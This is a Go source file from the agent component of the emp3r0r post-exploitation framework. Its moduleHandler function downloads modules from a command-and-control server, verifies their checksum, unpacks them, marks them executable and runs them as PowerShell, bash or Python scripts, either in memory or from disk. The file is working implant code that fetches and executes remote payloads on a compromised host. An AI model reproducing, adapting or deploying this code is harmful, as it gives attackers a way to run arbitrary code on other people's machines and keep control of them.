package agent

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"github.com/jm33-m0/arc"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// moduleHandler downloads and runs modules from C2
// env: in format "VAR1=VALUE1,VAR2=VALUE2"
func moduleHandler(download_addr, file_to_download, payload_type, modName, checksum, exec_cmd string, env []string, inMem bool) (out string) {
	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
	var err error

	// download and extract module file
	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
	if downloadErr != nil {
		return downloadErr.Error()
	}
	payload_data := payload_data_downloaded
	if !inMem {
		// write-to-disk modules
		err := os.WriteFile(tarball, payload_data, 0o600)
		if err != nil {
			return fmt.Sprintf("writing %s: %v", tarball, err)
		}

		if extractErr := extractModule(modDir, tarball); extractErr != nil {
			return extractErr.Error()
		}

		// cd to module dir
		defer os.Chdir(RuntimeConfig.AgentRoot)
		err = os.Chdir(modDir)
		if err != nil {
			return fmt.Sprintf("cd to %s: %v", modDir, err)
		}
	} else {
		payload_data, err = arc.DecompressXz(payload_data_downloaded)
		if err != nil {
			return fmt.Sprintf("decompressing %s: %v", file_to_download, err)
		}
	}

	// construct command
	var (
		executable string
		args       = []string{}
	)
	fields := strings.Fields(exec_cmd)
	if !inMem {
		if len(fields) == 0 {
			return fmt.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
		}
		executable = fields[0]
	}
	switch payload_type {
	case "powershell":
		out, err := RunPSScript(payload_data)
		if err != nil {
			return fmt.Sprintf("running powershell script: %s (%v)", out, err)
		}
		return out
	case "bash":
		executable = emp3r0r_data.DefaultShell
		out, err := RunShellScript(payload_data)
		if err != nil {
			return fmt.Sprintf("running shell script: %s (%v)", out, err)
		}
		return out

	case "python":
		executable = "python"
		args = []string{exec_cmd}
		if inMem {
			out, err := RunPythonScript(payload_data)
			if err != nil {
				return fmt.Sprintf("running python script: %s (%v)", out, err)
			}
			return out
		}
	default:
		args = fields[1:]
	}
	cmd := exec.Command(executable, args...)
	cmd.Env = env
	log.Printf("Running %v (%v)", cmd.Args, cmd.Env)
	outBytes, err := cmd.CombinedOutput()
	out = string(outBytes)
	if err != nil {
		return fmt.Sprintf("running %s: %s (%v)", strconv.Quote(exec_cmd), out, err)
	}

	return out
}

func getScriptExtension() string {
	if runtime.GOOS == "windows" {
		return "ps1"
	}
	return "sh"
}

func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
	if tun.SHA256SumFile(file_to_download) != checksum {
		if data, err = SmartDownload(download_addr, file_to_download, "", checksum); err != nil {
			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
		}
	}

	if tun.SHA256SumRaw(data) != checksum {
		log.Print("Checksum failed, restarting...")
		util.TakeABlink()
		os.RemoveAll(file_to_download)
		return downloadAndVerifyModule(file_to_download, checksum, download_addr) // Recursive call
	}
	return data, nil
}

func extractModule(modDir, tarball string) error {
	os.RemoveAll(modDir)
	if err := util.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
		return fmt.Errorf("unarchive module tarball: %v", err)
	}

	return processModuleFiles(modDir)
}

func processModuleFiles(modDir string) error {
	files, err := os.ReadDir(modDir)
	if err != nil {
		return fmt.Errorf("processing module files: %v", err)
	}

	for _, f := range files {
		if err := os.Chmod(filepath.Join(modDir, f.Name()), 0o700); err != nil {
			return fmt.Errorf("setting permissions for %s: %v", f.Name(), err)
		}

		libsTarball := filepath.Join(modDir, "libs.tar.xz")
		if util.IsExist(libsTarball) {
			os.RemoveAll(filepath.Join(modDir, "libs"))
			if err := util.Unarchive(libsTarball, modDir); err != nil {
				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
			}
		}
	}
	return nil
}
